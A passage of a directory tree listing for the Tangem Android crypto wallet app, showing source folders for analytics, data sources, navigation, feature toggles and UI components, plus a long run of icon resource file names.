│   │   │                                   ├── AnalyticsParam.kt
│   │   │                                   ├── Basic.kt
│   │   │                                   └── OneTimeAnalyticsEvent.kt
│   │   └── src
│   │       └── main
│   │           └── java
│   │               └── com
│   │                   └── tangem
│   │                       └── core
│   │                           └── analytics
│   │                               ├── Analytics.kt
│   │                               ├── api
│   │                               │   ├── ClientApi.kt
│   │                               │   ├── EventFilterApi.kt
│   │                               │   ├── EventHandlerApi.kt
│   │                               │   └── ParamsInterceptorApi.kt
│   │                               ├── di
│   │                               │   └── AnalyticsModule.kt
│   │                               └── filter
│   │                                   └── OneTimeEventFilter.kt
│   ├── datasource
│   │   ├── build.gradle.kts
│   │   ├── schemas
│   │   │   └── com.tangem.datasource.local.db.TangemDatabase
│   │   │       └── 1.json
│   │   └── src
│   │       ├── main
│   │       │   ├── AndroidManifest.xml
│   │       │   └── java
│   │       │       └── com
│   │       │           └── tangem
│   │       │               └── datasource
│   │       │                   ├── api
│   │       │                   │   ├── common
│   │       │                   │   │   ├── adapter
│   │       │                   │   │   │   ├── BigDecimalAdapter.kt
│   │       │                   │   │   │   ├── DateTimeAdapter.kt
│   │       │                   │   │   │   ├── LocalDateAdapter.kt
│   │       │                   │   │   │   └── UnknownEnumMoshiAdapter.kt
│   │       │                   │   │   ├── AuthProvider.kt
│   │       │                   │   │   ├── MoshiConverter.kt
│   │       │                   │   │   ├── response
│   │       │                   │   │   │   ├── ApiResponseCallAdapterFactory.kt
│   │       │                   │   │   │   ├── ApiResponseCallAdapter.kt
│   │       │                   │   │   │   ├── ApiResponseCallDelegate.kt
│   │       │                   │   │   │   ├── ApiResponseError.kt
│   │       │                   │   │   │   ├── ApiResponseExt.kt
│   │       │                   │   │   │   ├── ApiResponse.kt
│   │       │                   │   │   │   └── ResponseExt.kt
│   │       │                   │   │   └── Retrofit.kt
│   │       │                   │   ├── express
│   │       │                   │   │   ├── models
│   │       │                   │   │   │   ├── request
│   │       │                   │   │   │   │   ├── AssetsRequestBody.kt
│   │       │                   │   │   │   │   ├── LeastTokenInfo.kt
│   │       │                   │   │   │   │   └── PairsRequestBody.kt
│   │       │                   │   │   │   ├── response
│   │       │                   │   │   │   │   ├── Asset.kt
│   │       │                   │   │   │   │   ├── ExchangeDataResponse.kt
│   │       │                   │   │   │   │   ├── ExchangeProvider.kt
│   │       │                   │   │   │   │   ├── ExchangeQuoteResponse.kt
│   │       │                   │   │   │   │   ├── ExchangeStatusResponse.kt
│   │       │                   │   │   │   │   ├── ExpressErrorResponse.kt
│   │       │                   │   │   │   │   ├── SwapPair.kt
│   │       │                   │   │   │   │   └── SwapPairsWithProviders.kt
│   │       │                   │   │   │   └── TangemExpressValues.kt
│   │       │                   │   │   └── TangemExpressApi.kt
│   │       │                   │   ├── promotion
│   │       │                   │   │   └── models
│   │       │                   │   │       └── PromotionInfoResponse.kt
│   │       │                   │   ├── stakekit
│   │       │                   │   │   ├── models
│   │       │                   │   │   │   ├── request
│   │       │                   │   │   │   │   ├── MultipleYieldBalancesRequestBody.kt
│   │       │                   │   │   │   │   ├── RevenueOption.kt
│   │       │                   │   │   │   │   ├── YieldBalanceRequestBody.kt
│   │       │                   │   │   │   │   └── YieldType.kt
│   │       │                   │   │   │   └── response
│   │       │                   │   │   │       ├── EnabledYieldsResponse.kt
│   │       │                   │   │   │       └── model
│   │       │                   │   │   │           ├── AddressArgument.kt
│   │       │                   │   │   │           ├── StakingActionType.kt
│   │       │                   │   │   │           ├── Token.kt
│   │       │                   │   │   │           ├── TokenWithYield.kt
│   │       │                   │   │   │           ├── YieldBalances.kt
│   │       │                   │   │   │           ├── YieldBalanceWrapper.kt
│   │       │                   │   │   │           └── Yield.kt
│   │       │                   │   │   └── StakeKitApi.kt
│   │       │                   │   └── tangemTech
│   │       │                   │       ├── models
│   │       │                   │       │   ├── CoinsResponse.kt
│   │       │                   │       │   ├── CreateUserNetworkAccountBody.kt
│   │       │                   │       │   ├── CreateUserNetworkAccountResponse.kt
│   │       │                   │       │   ├── CreateUserTokensAccountBody.kt
│   │       │                   │       │   ├── CurrenciesResponse.kt
│   │       │                   │       │   ├── FeaturesResponse.kt
│   │       │                   │       │   ├── GeoResponse.kt
│   │       │                   │       │   ├── QuotesResponse.kt
│   │       │                   │       │   ├── RatesResponse.kt
│   │       │                   │       │   ├── ReferralResponse.kt
│   │       │                   │       │   ├── SalesResponse.kt
│   │       │                   │       │   ├── ShopResponse.kt
│   │       │                   │       │   ├── StartReferralBody.kt
│   │       │                   │       │   ├── UpdateUserTokensAccountBody.kt
│   │       │                   │       │   ├── UserTokensAccountResponse.kt
│   │       │                   │       │   ├── UserTokensResponse.kt
│   │       │                   │       │   ├── UserTokensSettingsResponse.kt
│   │       │                   │       │   └── v2
│   │       │                   │       │       └── UserTokensResponseV2.kt
│   │       │                   │       ├── TangemTechApi.kt
│   │       │                   │       ├── TangemTechApiV2.kt
│   │       │                   │       ├── TangemTechServiceApi.kt
│   │       │                   │       └── TangemTechService.kt
│   │       │                   ├── asset
│   │       │                   │   ├── loader
│   │       │                   │   │   └── AssetLoader.kt
│   │       │                   │   └── reader
│   │       │                   │       ├── AndroidAssetReader.kt
│   │       │                   │       └── AssetReader.kt
│   │       │                   ├── config
│   │       │                   │   ├── ConfigManagerImpl.kt
│   │       │                   │   ├── ConfigManager.kt
│   │       │                   │   ├── FeaturesLocalLoader.kt
│   │       │                   │   ├── Loader.kt
│   │       │                   │   └── models
│   │       │                   │       ├── ChatConfig.kt
│   │       │                   │       ├── Config.kt
│   │       │                   │       ├── ExpressModel.kt
│   │       │                   │       ├── JsonModels.kt
│   │       │                   │       ├── ProviderModel.kt
│   │       │                   │       └── TonCenterKeys.kt
│   │       │                   ├── connection
│   │       │                   │   ├── NetworkConnectionManager.kt
│   │       │                   │   └── RealInternetConnectionManager.kt
│   │       │                   ├── crypto
│   │       │                   │   ├── DataSignatureVerifier.kt
│   │       │                   │   └── Sha256SignatureVerifier.kt
│   │       │                   ├── demo
│   │       │                   │   └── DemoModeDatasource.kt
│   │       │                   ├── di
│   │       │                   │   ├── AppCurrencyDataModule.kt
│   │       │                   │   ├── AppPreferencesStoreModule.kt
│   │       │                   │   ├── AssetReaderModule.kt
│   │       │                   │   ├── AssetsStoreModule.kt
│   │       │                   │   ├── CacheKeysStoreModule.kt
│   │       │                   │   ├── ConfigModule.kt
│   │       │                   │   ├── DevTangemApi.kt
│   │       │                   │   ├── FilesModule.kt
│   │       │                   │   ├── MoshiDaggerKey.kt
│   │       │                   │   ├── MoshiModule.kt
│   │       │                   │   ├── NetworkConnectionModule.kt
│   │       │                   │   ├── NetworkModule.kt
│   │       │                   │   ├── NetworksStatusesStoreModule.kt
│   │       │                   │   ├── QuotesStoreModule.kt
│   │       │                   │   ├── SecurityModule.kt
│   │       │                   │   ├── StatusCodeInterceptor.kt
│   │       │                   │   ├── SwapTransactionStatusStoreModule.kt
│   │       │                   │   ├── TestnetTokensStorageModule.kt
│   │       │                   │   ├── TxHistoryItemsStoreModule.kt
│   │       │                   │   ├── UserTokensStoreModule.kt
│   │       │                   │   └── WalletManagersStoreModule.kt
│   │       │                   ├── files
│   │       │                   │   ├── AndroidFileReader.kt
│   │       │                   │   └── FileReader.kt
│   │       │                   ├── local
│   │       │                   │   ├── appcurrency
│   │       │                   │   │   ├── AvailableAppCurrenciesStore.kt
│   │       │                   │   │   └── implementation
│   │       │                   │   │       └── DefaultAvailableAppCurrenciesStore.kt
│   │       │                   │   ├── cache
│   │       │                   │   │   ├── CacheKeysStore.kt
│   │       │                   │   │   ├── DefaultCacheKeysStore.kt
│   │       │                   │   │   └── model
│   │       │                   │   │       └── CacheKey.kt
│   │       │                   │   ├── card
│   │       │                   │   │   └── UsedCardInfo.kt
│   │       │                   │   ├── datastore
│   │       │                   │   │   ├── core
│   │       │                   │   │   │   ├── DataStore.kt
│   │       │                   │   │   │   ├── StringKeyDataStoreDecorator.kt
│   │       │                   │   │   │   └── StringKeyDataStore.kt
│   │       │                   │   │   ├── FileDataStore.kt
│   │       │                   │   │   ├── RuntimeDataStore.kt
│   │       │                   │   │   └── utils
│   │       │                   │   │       └── Trigger.kt
│   │       │                   │   ├── db
│   │       │                   │   │   ├── dao
│   │       │                   │   │   │   ├── CryptoCurrenciesAccountDao.kt
│   │       │                   │   │   │   ├── CryptoCurrencyDao.kt
│   │       │                   │   │   │   └── UserWalletDao.kt
│   │       │                   │   │   ├── di
│   │       │                   │   │   │   └── TangemDatabaseModule.kt
│   │       │                   │   │   ├── entity
│   │       │                   │   │   │   ├── CryptoCurrenciesAccountEntity.kt
│   │       │                   │   │   │   ├── CryptoCurrencyEntity.kt
│   │       │                   │   │   │   └── UserWalletEntity.kt
│   │       │                   │   │   ├── TangemDatabase.kt
│   │       │                   │   │   └── utils
│   │       │                   │   │       └── Converters.kt
│   │       │                   │   ├── network
│   │       │                   │   │   ├── DefaultNetworksStatusesStore.kt
│   │       │                   │   │   └── NetworksStatusesStore.kt
│   │       │                   │   ├── preferences
│   │       │                   │   │   ├── AppPreferencesStore.kt
│   │       │                   │   │   ├── PreferencesDataStore.kt
│   │       │                   │   │   ├── PreferencesKeys.kt
│   │       │                   │   │   └── utils
│   │       │                   │   │       ├── AppPreferencesStoreExt.kt
│   │       │                   │   │       ├── PreferencesDataStoreExt.kt
│   │       │                   │   │       └── SharedPreferencesKeyMigration.kt
│   │       │                   │   ├── quote
│   │       │                   │   │   ├── DefaultQuotesStore.kt
│   │       │                   │   │   ├── model
│   │       │                   │   │   │   └── StoredQuote.kt
│   │       │                   │   │   └── QuotesStore.kt
│   │       │                   │   ├── swaptx
│   │       │                   │   │   ├── DefaultSwapTransactionStatusStore.kt
│   │       │                   │   │   └── SwapTransactionStatusStore.kt
│   │       │                   │   ├── testnet
│   │       │                   │   │   ├── DefaultTestnetTokensStorage.kt
│   │       │                   │   │   ├── models
│   │       │                   │   │   │   └── TestnetTokensConfig.kt
│   │       │                   │   │   └── TestnetTokensStorage.kt
│   │       │                   │   ├── token
│   │       │                   │   │   ├── AssetsStore.kt
│   │       │                   │   │   ├── DefaultAssetsStore.kt
│   │       │                   │   │   ├── DefaultUserTokensStore.kt
│   │       │                   │   │   └── UserTokensStore.kt
│   │       │                   │   ├── txhistory
│   │       │                   │   │   ├── DefaultTxHistoryItemsStore.kt
│   │       │                   │   │   └── TxHistoryItemsStore.kt
│   │       │                   │   ├── userwallet
│   │       │                   │   │   └── UserWalletsStore.kt
│   │       │                   │   └── walletmanager
│   │       │                   │       ├── DefaultWalletManagersStore.kt
│   │       │                   │       └── WalletManagersStore.kt
│   │       │                   └── utils
│   │       │                       ├── HttpClientExt.kt
│   │       │                       └── RequestHeader.kt
│   │       └── test
│   │           └── kotlin
│   │               └── com
│   │                   └── tangem
│   │                       └── datasource
│   │                           └── asset
│   │                               ├── loader
│   │                               │   └── AssetLoaderTest.kt
│   │                               └── reader
│   │                                   └── AndroidAssetReaderTest.kt
│   ├── decompose
│   │   ├── build.gradle.kts
│   │   └── src
│   │       └── main
│   │           └── kotlin
│   │               └── com
│   │                   └── tangem
│   │                       └── core
│   │                           └── decompose
│   │                               ├── context
│   │                               │   ├── AppComponentContextChildrenFactory.kt
│   │                               │   ├── AppComponentContext.kt
│   │                               │   └── DefaultAppComponentContext.kt
│   │                               ├── di
│   │                               │   ├── ComponentScoped.kt
│   │                               │   ├── DecomposeComponent.kt
│   │                               │   ├── HiltComponentBuilderOwner.kt
│   │                               │   └── RootAppComponentContext.kt
│   │                               ├── model
│   │                               │   ├── ModelEntryPoint.kt
│   │                               │   └── Model.kt
│   │                               ├── navigation
│   │                               │   ├── AppNavigationProvider.kt
│   │                               │   ├── DefaultAppNavigationProvider.kt
│   │                               │   ├── DefaultRouter.kt
│   │                               │   ├── NavigationOwner.kt
│   │                               │   ├── Route.kt
│   │                               │   └── Router.kt
│   │                               ├── ui
│   │                               │   ├── DefaultUiMessageSender.kt
│   │                               │   ├── UiMessageHandler.kt
│   │                               │   ├── UiMessage.kt
│   │                               │   ├── UiMessageSender.kt
│   │                               │   └── UiMessageSenderOwner.kt
│   │                               └── utils
│   │                                   ├── ComponentCoroutineScope.kt
│   │                                   ├── ComponentScopeOwner.kt
│   │                                   ├── DispatchersOwner.kt
│   │                                   └── TagsOwner.kt
│   ├── deep-links
│   │   ├── build.gradle.kts
│   │   ├── global
│   │   │   ├── build.gradle.kts
│   │   │   └── src
│   │   │       └── main
│   │   │           └── kotlin
│   │   │               └── com
│   │   │                   └── tangem
│   │   │                       └── core
│   │   │                           └── deeplink
│   │   │                               └── global
│   │   │                                   ├── BuyCurrencyDeepLink.kt
│   │   │                                   └── SellCurrencyDeepLink.kt
│   │   └── src
│   │       └── main
│   │           └── kotlin
│   │               └── com
│   │                   └── tangem
│   │                       └── core
│   │                           └── deeplink
│   │                               ├── DeepLink.kt
│   │                               ├── DeepLinksRegistry.kt
│   │                               ├── di
│   │                               │   └── DeepLinksModule.kt
│   │                               ├── impl
│   │                               │   └── DefaultDeepLinksRegistry.kt
│   │                               └── utils
│   │                                   └── DeepLinksLifecycleObserver.kt
│   ├── featuretoggles
│   │   ├── build.gradle.kts
│   │   └── src
│   │       ├── main
│   │       │   ├── assets
│   │       │   │   └── configs
│   │       │   │       └── feature_toggles_config.json
│   │       │   └── kotlin
│   │       │       └── com
│   │       │           └── tangem
│   │       │               └── core
│   │       │                   └── featuretoggle
│   │       │                       ├── contract
│   │       │                       │   ├── VersionAvailabilityContract.kt
│   │       │                       │   └── Version.kt
│   │       │                       ├── di
│   │       │                       │   └── FeatureTogglesManagerModule.kt
│   │       │                       ├── manager
│   │       │                       │   ├── DevFeatureTogglesManager.kt
│   │       │                       │   ├── FeatureTogglesManager.kt
│   │       │                       │   ├── MutableFeatureTogglesManager.kt
│   │       │                       │   └── ProdFeatureTogglesManager.kt
│   │       │                       ├── storage
│   │       │                       │   ├── FeatureToggle.kt
│   │       │                       │   ├── FeatureTogglesStorage.kt
│   │       │                       │   └── LocalFeatureTogglesStorage.kt
│   │       │                       ├── utils
│   │       │                       │   └── CollectionExt.kt
│   │       │                       └── version
│   │       │                           ├── DefaultVersionProvider.kt
│   │       │                           └── VersionProvider.kt
│   │       └── test
│   │           └── kotlin
│   │               └── com
│   │                   └── tangem
│   │                       └── core
│   │                           └── featuretoggle
│   │                               ├── contract
│   │                               │   ├── VersionAvailabilityContractTest.kt
│   │                               │   └── VersionTest.kt
│   │                               ├── manager
│   │                               │   ├── DevFeatureTogglesManagerTest.kt
│   │                               │   └── ProdFeatureTogglesManagerTest.kt
│   │                               └── storage
│   │                                   └── LocalFeatureTogglesStorageTest.kt
│   ├── navigation
│   │   ├── build.gradle.kts
│   │   └── src
│   │       └── main
│   │           └── java
│   │               └── com
│   │                   └── tangem
│   │                       └── core
│   │                           └── navigation
│   │                               ├── di
│   │                               │   └── EmailSenderModule.kt
│   │                               ├── email
│   │                               │   ├── AndroidEmailSender.kt
│   │                               │   └── EmailSender.kt
│   │                               ├── FragmentShareTransition.kt
│   │                               ├── NavigationAction.kt
│   │                               ├── NavigationState.kt
│   │                               ├── ReduxNavController.kt
│   │                               └── StateDialog.kt
│   ├── res
│   │   ├── build.gradle.kts
│   │   └── src
│   │       └── main
│   │           └── res
│   │               ├── values
│   │               │   ├── strings-blockchain.xml
│   │               │   ├── strings_special.xml
│   │               │   └── strings.xml
│   │               ├── values-de
│   │               │   ├── strings-blockchain.xml
│   │               │   └── strings.xml
│   │               ├── values-fr
│   │               │   ├── strings-blockchain.xml
│   │               │   └── strings.xml
│   │               ├── values-it
│   │               │   ├── strings-blockchain.xml
│   │               │   └── strings.xml
│   │               ├── values-ru
│   │               │   ├── strings-blockchain.xml
│   │               │   └── strings.xml
│   │               └── values-zh-rTW
│   │                   ├── strings-blockchain.xml
│   │                   └── strings.xml
│   ├── ui
│   │   ├── build.gradle.kts
│   │   └── src
│   │       └── main
│   │           ├── java
│   │           │   └── com
│   │           │       └── tangem
│   │           │           └── core
│   │           │               └── ui
│   │           │                   ├── clipboard
│   │           │                   │   └── ClipboardManager.kt
│   │           │                   ├── components
│   │           │                   │   ├── appbar
│   │           │                   │   │   ├── AppBarWithAdditionalButtons.kt
│   │           │                   │   │   ├── AppBarWithBackButtonAndIconContent.kt
│   │           │                   │   │   ├── AppBarWithBackButtonAndIcon.kt
│   │           │                   │   │   ├── AppBarWithBackButton.kt
│   │           │                   │   │   ├── AppBarWithSearch.kt
│   │           │                   │   │   └── models
│   │           │                   │   │       └── AdditionalButton.kt
│   │           │                   │   ├── atoms
│   │           │                   │   │   ├── Hand.kt
│   │           │                   │   │   └── text
│   │           │                   │   │       ├── BoundCounter.kt
│   │           │                   │   │       └── EllipsisText.kt
│   │           │                   │   ├── bottomsheets
│   │           │                   │   │   ├── chooseaddress
│   │           │                   │   │   │   ├── ChooseAddressBottomSheetConfig.kt
│   │           │                   │   │   │   └── ChooseAddressBottomSheet.kt
│   │           │                   │   │   ├── TangemBottomSheetConfigContent.kt
│   │           │                   │   │   ├── TangemBottomSheetConfig.kt
│   │           │                   │   │   ├── TangemBottomSheetDraggableHeader.kt
│   │           │                   │   │   ├── TangemBottomSheet.kt
│   │           │                   │   │   └── tokenreceive
│   │           │                   │   │       ├── AddressMappers.kt
│   │           │                   │   │       ├── AddressModel.kt
│   │           │                   │   │       ├── TokenReceiveBottomSheetConfig.kt
│   │           │                   │   │       └── TokenReceiveBottomSheet.kt
│   │           │                   │   ├── buttons
│   │           │                   │   │   ├── actions
│   │           │                   │   │   │   ├── ActionButtonConfig.kt
│   │           │                   │   │   │   └── Actions.kt
│   │           │                   │   │   ├── common
│   │           │                   │   │   │   ├── TangemButtonColors.kt
│   │           │                   │   │   │   ├── TangemButtonIconPosition.kt
│   │           │                   │   │   │   ├── TangemButton.kt
│   │           │                   │   │   │   ├── TangemButtonsDefaults.kt
│   │           │                   │   │   │   └── TangemButtonSize.kt
│   │           │                   │   │   ├── HorizontalActionChips.kt
│   │           │                   │   │   ├── segmentedbutton
│   │           │                   │   │   │   └── SegmentedButton.kt
│   │           │                   │   │   └── SmallButton.kt
│   │           │                   │   ├── Buttons.kt
│   │           │                   │   ├── Cards.kt
│   │           │                   │   ├── currency
│   │           │                   │   │   ├── DefaultCurrencyIcon.kt
│   │           │                   │   │   ├── fiaticon
│   │           │                   │   │   │   └── FiatIcon.kt
│   │           │                   │   │   └── tokenicon
│   │           │                   │   │       ├── ContentIcon.kt
│   │           │                   │   │       ├── converter
│   │           │                   │   │       │   └── CryptoCurrencyToIconStateConverter.kt
│   │           │                   │   │       ├── IconBadge.kt
│   │           │                   │   │       ├── TokenIcon.kt
│   │           │                   │   │       └── TokenIconState.kt
│   │           │                   │   ├── CurrencyPlaceholderIcon.kt
│   │           │                   │   ├── Dialogs.kt
│   │           │                   │   ├── fields
│   │           │                   │   │   ├── AmountTextField.kt
│   │           │                   │   │   ├── SimpleDialogTextField.kt
│   │           │                   │   │   ├── SimpleTextField.kt
│   │           │                   │   │   └── visualtransformations
│   │           │                   │   │       └── AmountVisualTransformation.kt
│   │           │                   │   ├── icons
│   │           │                   │   │   └── identicon
│   │           │                   │   │       ├── Blockies.kt
│   │           │                   │   │       └── IdentIcon.kt
│   │           │                   │   ├── inputrow
│   │           │                   │   │   ├── inner
│   │           │                   │   │   │   ├── DividerContainer.kt
│   │           │                   │   │   │   └── PasteButton.kt
│   │           │                   │   │   ├── InputRowApprox.kt
│   │           │                   │   │   ├── InputRowBestRate.kt
│   │           │                   │   │   ├── InputRowDefault.kt
│   │           │                   │   │   ├── InputRowEnterAmount.kt
│   │           │                   │   │   ├── InputRowEnterInfoAmount.kt
│   │           │                   │   │   ├── InputRowEnterInfo.kt
│   │           │                   │   │   ├── InputRowEnter.kt
│   │           │                   │   │   ├── InputRowImage.kt
│   │           │                   │   │   ├── InputRowRecipientDefault.kt
│   │           │                   │   │   └── InputRowRecipient.kt
│   │           │                   │   ├── Keyboard.kt
│   │           │                   │   ├── marketprice
│   │           │                   │   │   ├── MarketPriceBlock.kt
│   │           │                   │   │   ├── MarketPriceBlockState.kt
│   │           │                   │   │   ├── PriceChangeState.kt
│   │           │                   │   │   ├── PriceChangeType.kt
│   │           │                   │   │   └── utils
│   │           │                   │   │       └── PriceChangeConverter.kt
│   │           │                   │   ├── MiddleEllipsisText.kt
│   │           │                   │   ├── notifications
│   │           │                   │   │   ├── NotificationConfig.kt
│   │           │                   │   │   ├── Notification.kt
│   │           │                   │   │   ├── NotificationWithBackground.kt
│   │           │                   │   │   └── TravalaNotificationWithBackground.kt
│   │           │                   │   ├── Notifier.kt
│   │           │                   │   ├── QrCode.kt
│   │           │                   │   ├── ResizableText.kt
│   │           │                   │   ├── rows
│   │           │                   │   │   ├── ActionRow.kt
│   │           │                   │   │   └── SelectorRowItem.kt
│   │           │                   │   ├── SettingsRow.kt
│   │           │                   │   ├── Shimmers.kt
│   │           │                   │   ├── snackbar
│   │           │                   │   │   ├── CopiedTextSnackbarHost.kt
│   │           │                   │   │   ├── CopiedTextSnackbar.kt
│   │           │                   │   │   ├── TangemSnackbarHost.kt
│   │           │                   │   │   ├── TangemSnackbar.kt
│   │           │                   │   │   └── TangemSnackbarModelProvider.kt
│   │           │                   │   ├── Spacers.kt
│   │           │                   │   ├── states
│   │           │                   │   │   └── SelectableItemsState.kt
│   │           │                   │   ├── SystemBarsEffect.kt
│   │           │                   │   ├── TangemSwitch.kt
│   │           │                   │   ├── TextFields.kt
│   │           │                   │   ├── transactions
│   │           │                   │   │   ├── empty
│   │           │                   │   │   │   ├── EmptyTransactionBlock.kt
│   │           │                   │   │   │   └── EmptyTransactionsBlockState.kt
│   │           │                   │   │   ├── state
│   │           │                   │   │   │   ├── TransactionState.kt
│   │           │                   │   │   │   └── TxHistoryState.kt
│   │           │                   │   │   ├── TransactionDoneTitle.kt
│   │           │                   │   │   ├── Transaction.kt
│   │           │                   │   │   ├── TransactionList.kt
│   │           │                   │   │   ├── TxHistoryContentItem.kt
│   │           │                   │   │   ├── TxHistoryGroupTitle.kt
│   │           │                   │   │   └── TxHistoryTitle.kt
│   │           │                   │   └── Warnings.kt
│   │           │                   ├── decorations
│   │           │                   │   └── RoundedDecorations.kt
│   │           │                   ├── event
│   │           │                   │   ├── EventEffect.kt
│   │           │                   │   └── StateEvent.kt
│   │           │                   ├── extensions
│   │           │                   │   ├── BlockchainIcons.kt
│   │           │                   │   ├── ComposeNavigationExt.kt
│   │           │                   │   ├── Context.kt
│   │           │                   │   ├── CryptoCurrency.kt
│   │           │                   │   ├── Fragment.kt
│   │           │                   │   ├── ImageReference.kt
│   │           │                   │   ├── MarkdownExtension.kt
│   │           │                   │   ├── RememberExt.kt
│   │           │                   │   ├── String.kt
│   │           │                   │   ├── TextReference.kt
│   │           │                   │   └── WrappedList.kt
│   │           │                   ├── haptic
│   │           │                   │   ├── HapticManager.kt
│   │           │                   │   └── MockHapticManager.kt
│   │           │                   ├── message
│   │           │                   │   ├── EventMessageEffect.kt
│   │           │                   │   ├── EventMessageHandler.kt
│   │           │                   │   └── EventMessage.kt
│   │           │                   ├── res
│   │           │                   │   ├── TangemColorPalette.kt
│   │           │                   │   ├── TangemColors.kt
│   │           │                   │   ├── TangemDimens.kt
│   │           │                   │   ├── TangemShapes.kt
│   │           │                   │   ├── TangemTheme.kt
│   │           │                   │   ├── TangemThemePreview.kt
│   │           │                   │   └── TangemTypography.kt
│   │           │                   ├── screen
│   │           │                   │   ├── ComposeActivity.kt
│   │           │                   │   ├── ComposeBottomSheetFragment.kt
│   │           │                   │   ├── ComposeFragment.kt
│   │           │                   │   └── ComposeScreen.kt
│   │           │                   ├── test
│   │           │                   │   └── TestTags.kt
│   │           │                   ├── theme
│   │           │                   │   └── AppThemeModeHolder.kt
│   │           │                   ├── UiDependencies.kt
│   │           │                   └── utils
│   │           │                       ├── AnimationUtils.kt
│   │           │                       ├── BigDecimalFormatter.kt
│   │           │                       ├── DateTimeFormatters.kt
│   │           │                       ├── DateUtils.kt
│   │           │                       ├── DecimalFormatterExt.kt
│   │           │                       ├── GrayscaleUtils.kt
│   │           │                       ├── ImageBackgroundContrastChecker.kt
│   │           │                       ├── InputNumberFormatter.kt
│   │           │                       └── MultipleClickPreventer.kt
│   │           └── res
│   │               ├── drawable
│   │               │   ├── card_placeholder_black.webp
│   │               │   ├── ic_alert_24.xml
│   │               │   ├── ic_alert_circle_24.xml
│   │               │   ├── ic_alert_history_64.xml
│   │               │   ├── ic_alert_triangle_20.xml
│   │               │   ├── ic_algorand_22.xml
│   │               │   ├── ic_aptos_22.xml
│   │               │   ├── ic_arbitrum_22.xml
│   │               │   ├── ic_areon_22.xml
│   │               │   ├── ic_arrow_down_24.xml
│   │               │   ├── ic_arrow_down_8.xml
│   │               │   ├── ic_arrow_top_right_24.xml
│   │               │   ├── ic_arrow_up_24.xml
│   │               │   ├── ic_arrow_up_8.xml
│   │               │   ├── ic_aurora_22.xml
│   │               │   ├── ic_avalanche_22.xml
│   │               │   ├── ic_azero_22.xml
│   │               │   ├── ic_back_24.xml
│   │               │   ├── ic_base_22.xml
│   │               │   ├── ic_bird_24.xml
│   │               │   ├── ic_bitcoin_16.xml
│   │               │   ├── ic_bitcoin_cash_16.xml
│   │               │   ├── ic_bittensor_22.xml
│   │               │   ├── ic_bsc_16.xml
│   │               │   ├── ic_cardano_16.xml
│   │               │   ├── ic_chat_24.xml
│   │               │   ├── ic_check_24.xml
│   │               │   ├── ic_chevron_24.xml
│   │               │   ├── ic_chevron_right_24.xml
│   │               │   ├── ic_chevron_up_24.xml
│   │               │   ├── ic_chia_22.xml
│   │               │   ├── ic_clock_24.xml
│   │               │   ├── ic_close_24.xml
│   │               │   ├── ic_comment_24.xml
│   │               │   ├── ic_compass_24.xml
│   │               │   ├── ic_compass_64.xml
│   │               │   ├── ic_copy_24.xml
│   │               │   ├── ic_cosmos_22.xml
│   │               │   ├── ic_cronos_22.xml
│   │               │   ├── ic_currency_24.xml
│   │               │   ├── ic_custom_token_44.xml
│   │               │   ├── ic_dash_22.xml
│   │               │   ├── ic_decimal_22.xml
│   │               │   ├── ic_dischain_22.xml
│   │               │   ├── ic_discord_24.xml
│   │               │   ├── ic_discount_28.xml
│   │               │   ├── ic_doc_24.xml
│   │               │   ├── ic_dogecoin_16.xml
│   │               │   ├── ic_drag_24.xml
│   │               │   ├── ic_ducatus_22.xml
│   │               │   ├── ic_edit_24.xml
│   │               │   ├── ic_elipse_8.xml
│   │               │   ├── ic_empty_in_process_64.xml
│   │               │   ├── ic_empty_token_64.xml
│   │               │   ├── ic_eth_16.xml
│   │               │   ├── ic_ethereumpow_22.xml
│   │               │   ├── ic_exchange_horizontal_24.xml
│   │               │   ├── ic_exchange_vertical_24.xml
│   │               │   ├── ic_exclamation_24.xml
│   │               │   ├── ic_eye_off_outline_24.xml
│   │               │   ├── ic_facebook_24.xml
│   │               │   ├── ic_face_recognition_24.xml
│   │               │   ├── ic_fantom_22.xml
│   │               │   ├── ic_filter_24.xml
│   │               │   ├── ic_flare_22.xml
│   │               │   ├── ic_flash_off_24.xml
│   │               │   ├── ic_flash_on_24.xml
│   │               │   ├── ic_forward_12.xml
│   │               │   ├── ic_forward_24.xml
│   │               │   ├── ic_gallery_24.xml
│   │               │   ├── ic_github_24.xml
│   │               │   ├── ic_gnosis_22.xml
│   │               │   ├── ic_group_24.xml
│   │               │   ├── ic_group_drop_24.xml
│   │               │   ├── ic_hare_24.xml
│   │               │   ├── ic_heart_24.xml
│   │               │   ├── ic_hedera_22.xml
│   │               │   ├── ic_hide_24.xml
│   │               │   ├── ic_information_24.xml
│   │               │   ├── ic_instagram_24.xml
│   │               │   ├── ic_joystream_22.xml
│   │               │   ├── ic_kaspa_22.xml
│   │               │   ├── ic_kava_22.xml
│   │               │   ├── ic_koinos_22.xml
│   │               │   ├── ic_kusama_16.xml
│   │               │   ├── ic_linkedin_24.xml
│   │               │   ├── ic_litecoin_22.xml
│   │               │   ├── ic_lock_24.xml
│   │               │   ├── ic_locked_24.xml
│   │               │   ├── ic_manta_22.xml
│   │               │   ├── ic_mantle_22.xml
│   │               │   ├── ic_moonbeam_22.xml
│   │               │   ├── ic_moonriver_22.xml
│   │               │   ├── ic_more_vertical_24.xml
│   │               │   ├── ic_near_22.xml
│   │               │   ├── ic_no_token_44.xml
│   │               │   ├── ic_octaspace_22.xml
│   │               │   ├── ic_onboarding_text_edit_56.xml
│   │               │   ├── ic_optimism_22.xml
│   │               │   ├── ic_playa3ull_22.xml
│   │               │   ├── ic_pls_22.xml
│   │               │   ├── ic_plus_24.xml
│   │               │   ├── ic_polkadot_16.xml
│   │               │   ├── ic_polygon_22.xml
│   │               │   ├── ic_qrcode_scan_24.xml
│   │               │   ├── ic_question_24.xml
│   │               │   ├── ic_radiant_22.xml
│   │               │   ├── ic_ravencoin_22.xml
│   │               │   ├── ic_reddit_24.xml
│   │               │   ├── ic_refresh_24.xml
│   │               │   ├── ic_rsk_16.xml
│   │               │   ├── ic_scan_24.xml
│   │               │   ├── ic_search_24.xml
│   │               │   ├── ic_settings_24.xml
│   │               │   ├── ic_shape_circle.xml
│   │               │   ├── ic_share_24.xml
│   │               │   ├── ic_shibarium_22.xml
│   │               │   ├── ic_solana_16.xml
│   │               │   ├── ic_sort_24.xml
│   │               │   ├── ic_star_24.xml
│   │               │   ├── ic_stellar_16.xml
│   │               │   ├── ic_tangem_24.xml
│   │               │   ├── ic_taraxa_22.xml
│   │               │   ├── ic_telegram_24.xml
│   │               │   ├── ic_telos_22.xml
│   │               │   ├── ic_terra2_22.xml
│   │               │   ├── ic_terra_22.xml
│   │               │   ├── ic_tether_28.xml
│   │               │   ├── ic_text_24.xml
